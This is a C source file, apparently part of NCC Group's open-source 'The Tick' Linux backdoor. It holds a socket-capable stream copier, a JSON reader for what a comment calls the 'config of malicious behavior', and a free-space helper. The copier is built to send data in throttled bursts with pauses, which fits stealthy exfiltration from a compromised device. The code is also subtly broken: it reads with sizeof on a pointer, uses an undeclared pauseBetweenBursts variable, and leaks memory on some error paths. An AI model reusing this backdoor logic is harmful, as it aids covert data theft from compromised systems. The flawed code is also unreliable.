/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/statvfs.h>
#include <stdlib.h>
#include <time.h>

#include <json-c/json.h>
#include <string.h>


#include "file.h"

// Helper function to copy a file stream.
// Since uses low lever file descriptors it works with sockets too.
// Optional "count" parameter limits how many bytes to copy,
// use <0 to copy the entire stream. Returns 0 on success, -1 on error.
// "buffersize" determines how much data is sent with each time
// "transferFrequency" determines the pause between sends
// "burstDuration" determines how many sends are done before taking a longer pause determined by "pauseDuration"
int copy_stream(int source, int destination, ssize_t count, const config_t *config)
{

	char *buffer = malloc(config->bufferSize);
	if (!buffer) {
		return -1;
	}

	ssize_t copied = 0;
	ssize_t block = 0;
	int counter = 0;

	if (count == 0) return 0;
	while (count < 0 || copied < count) {
		block = read(source, buffer, sizeof(buffer));
		if (block < 0 || (block == 0 && count > 0 && copied < count)) {
			return -1;
		}
		if (block == 0) {
			free(buffer);
			return 0;
		}
		copied = copied + block;
		counter += 1;

		while (block > 0) {
			ssize_t tmp = write(destination, buffer, block);
			if (tmp <= 0) {
				free(buffer);
				return -1;
			}
			block = block - tmp;
		}

		// if it was the last block we skip the pause
		if (count < 0 || copied < count) {
			struct timespec req;

			// if the burstDuration is reached we pause for a longer time
			if (counter % config->burstDuration == 0) {
				req.tv_sec = config->pauseBetweenBursts / 1000;
				req.tv_nsec = (pauseBetweenBursts % 1000) * 1000000;
			}
			// else take a normal requestInterval pause
			else {
				req.tv_sec = config->transferFrequency / 1000;
				req.tv_nsec = (config->transferFrequency % 1000) * 1000000;
			}
			nanosleep(&req, NULL);
		}
	}

	free(buffer);
	return 0;
}


// helper function to get config of malicious behavior
int read_config(const char *filename, config_t *config) {
	FILE *file = fopen(filename, "r");
	if (!file) {
		fprintf(stderr, "Error: Cannot open config file '%s'\n", filename);
        	return -1;
	}

	// Get file size
	fseek(file, 0, SEEK_END);
	long file_size = ftell(file);
	fseek(file, 0, SEEK_SET);

	// Read file content
	char *buffer = malloc(file_size + 1);
	if (!buffer) {
		fclose(file);
		fprintf(stderr, "Error: Memory allocation failed\n");
		return -1;
	}
	size_t read_size = fread(buffer, 1, file_size, file);
	buffer[read_size] = '\0';
	fclose(file);

	if (read_size != file_size) {
		free(buffer);
		fprintf(stderr, "Error: Failed to read config file\n");
		return -1;
	}

	// Parse JSON
	struct json_object *parsed_json = json_tokener_parse(buffer);
	free(buffer);
	if (!parsed_json) {
		fprintf(stderr, "Error: Invalid JSON in config file\n");
		return -1;
	}

	// Extract fields
	struct json_object *j_bufferSize, *j_transferFrequency, *j_burstDuration, *j_pauseDuration;
	int success = 1;

	if (!json_object_object_get_ex(parsed_json, "bufferSize", &j_bufferSize) ||
			!json_object_is_type(j_bufferSize, json_type_int)) {
		fprintf(stderr, "Error: Missing or invalid 'bufferSize' in config\n");
		success = 0;
	}
	if (!json_object_object_get_ex(parsed_json, "transferFrequency", &j_transferFrequency) ||
			!json_object_is_type(j_transferFrequency, json_type_int)) {
		fprintf(stderr, "Error: Missing or invalid 'transferFrequency' in config\n");
		success = 0;
	}
	if (!json_object_object_get_ex(parsed_json, "burstDuration", &j_burstDuration) ||
			!json_object_is_type(j_burstDuration, json_type_int)) {
		fprintf(stderr, "Error: Missing or invalid 'burstDuration' in config\n");
		success = 0;
	}
	if (!json_object_object_get_ex(parsed_json, "pauseDuration", &j_pauseDuration) ||
			!json_object_is_type(j_pauseDuration, json_type_int)) {
		fprintf(stderr, "Error: Missing or invalid 'pauseDuration' in config\n");
		success = 0;
	}

	if (success) {
		config->bufferSize = json_object_get_int(j_bufferSize);
		config->transferFrequency = json_object_get_int(j_transferFrequency);
		config->burstDuration = json_object_get_int(j_burstDuration);
		config->pauseDuration = json_object_get_int(j_pauseDuration);

		// Validate values
		if (config->bufferSize <= 0 || config->transferFrequency <= 0 ||
				config->burstDuration < 0 || config->pauseDuration < 0) {
			fprintf(stderr, "Error: Config values must be positive (except pauseDuration)\n");
			success = 0;
		}
	}

	json_object_put(parsed_json); // Free JSON object
	return success ? 0 : -1;
}


// Helper function to get the free space available in a given mount point.
// Returns -1 on error.
ssize_t get_free_space(const char *pathname)
{
	struct statvfs svfs;
	if (statvfs(pathname, &svfs) < 0) return -1;
	return svfs.f_bfree * svfs.f_bsize;
}
